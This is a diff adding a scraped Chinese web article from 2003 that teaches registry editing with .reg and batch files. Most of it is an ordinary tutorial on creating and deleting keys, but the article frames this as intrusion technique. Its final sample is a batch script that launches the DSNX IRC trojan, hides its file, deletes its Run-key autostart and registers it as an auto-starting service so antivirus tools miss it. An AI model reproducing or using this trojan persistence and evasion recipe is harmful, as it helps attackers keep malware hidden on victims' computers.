@@ -1,0 +1,88 @@
+
+ 
+   
+  如何用批处理文件来操作注册表    热      【字体：小 大】 
+ 
+  
+   
+   
+ 如何用批处理文件来操作注册表 
+ 
+作者：不详 文章来源：来自 Internet 点击数：2153 更新时间：2003-11-2 
+ 
+ 
+在入侵过程中经常回操作注册表的特定的键值来实现一定的目的，例如为隐藏后门、木马程序而删除Run下残余的键值。或者创建一个服务。下面这片是Adam的关于如何用.REG文件来操作注册表的文章，写得很明白了，我就操一下：）
+关于注册表的操作，常见的是创建、修改、删除。 
+--创建
+
+创建分为两种，一种是创建子项(Subkey)
+注：如果你对注册表的命名不是很清楚，可以看看注册表命名标准手册(http://www.sometips.com/tips/registryhack/204.htm)
+
+我们创建一个文件，内容如下：
+
+Windows Registry Editor Version 5.00
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\Test4Adam]
+
+然后执行该脚本，你就已经在HKEY_LOCAL_MACHINE\SOFTWARE\下创建了一个名字为“Test4Adam”的子项。
+
+另一种是创建一个项目名称
+那这种文件格式就是典型的文件格式，和你从注册表中导出的文件格式一致，内容如下：
+
+Windows Registry Editor Version 5.00
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\Test4Adam]
+"Test1"="Adam"
+"Test2"=hex:61
+"Test3"=dword:00000064
+
+Test1的类型是“String Value”
+Test2的类型是“Binary Value”
+Test3的类型是“DWORD Value”
+
+注意：如果你的注册表中不存在Test4Adam这个子项，那么该脚本会为你创建该子项。
+
+--修改
+修改相对来说比较简单，只要把你需要修改的项目导出，然后用记事本进行修改，然后导入即可，在此我就不再赘述。
+
+--删除
+我们首先来说说删除一个项目名称，我们创建一个如下的文件：
+
+Windows Registry Editor Version 5.00
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\Test4Adam]
+"Test1"=-
+
+执行该脚本，HKEY_LOCAL_MACHINE\SOFTWARE\Test4Adam下的"Test1"就被删除了；
+
+我们再看看删除一个子项，我们创建一个如下的脚本：
+
+Windows Registry Editor Version 5.00
+
+[-HKEY_LOCAL_MACHINE\SOFTWARE\Test4Adam]
+
+执行该脚本，HKEY_LOCAL_MACHINE\SOFTWARE\Test4Adam就已经被删除了。
+
+相信看到这里，.reg文件你基本已经掌握了。那么现在的目标就是用批处理来创建特定内容的.reg文件了，记得我们前面说道的利用重定向符号可以很容易地创建特定类型的文件。就像上面那个例子：
+Windows Registry Editor Version 5.00
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\Test4Adam]
+"Test1"="Adam"
+"Test2"=hex:61
+"Test3"=dword:00000064
+只需要这样：
+@echo Windows Registry Editor Version 5.00>>test.reg
+
+@echo [HKEY_LOCAL_MACHINE\SOFTWARE\Test4Adam]>>test.reg
+@echo "Test1"="Adam">>test.reg
+@echo "Test2"=hex:61>>test.reg
+@echo "Test3"=dword:00000064>>test.reg
+
+
+samlpe2: 我们现在在使用一些比较老的木马时,可能会在注册表的[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run(Runonce、Runservices、Runexec)]下生成一个键值用来实现木马的自启动.但是这样很容易暴露木马程序的路径,从而导致木马被查杀,相对地若是将木马程序注册为系统服务则相对安全一些.下面以配置好地IRC木马DSNX为例(名为windrv32.exe) @start windrv32.exe @attrib +h +r windrv32.exe @echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run] >>patch.dll @echo "windsnx "= - >>patch.dll @sc.exe create Windriversrvtype= kernel start= auto displayname = WindowsDriver binpath= c:\winnt\system32\windrv32.exe @regedit /s patch.dll @delete patch.dll @REM [删除DSNXDE在注册表中的启动项，用sc.exe将之注册为系统关键性服务的同时将其属性设为隐藏和只读，并config为自启动] @REM 这样不是更安全^_^. 
+ 
+ 
+ 
+ 
+ 
+ 
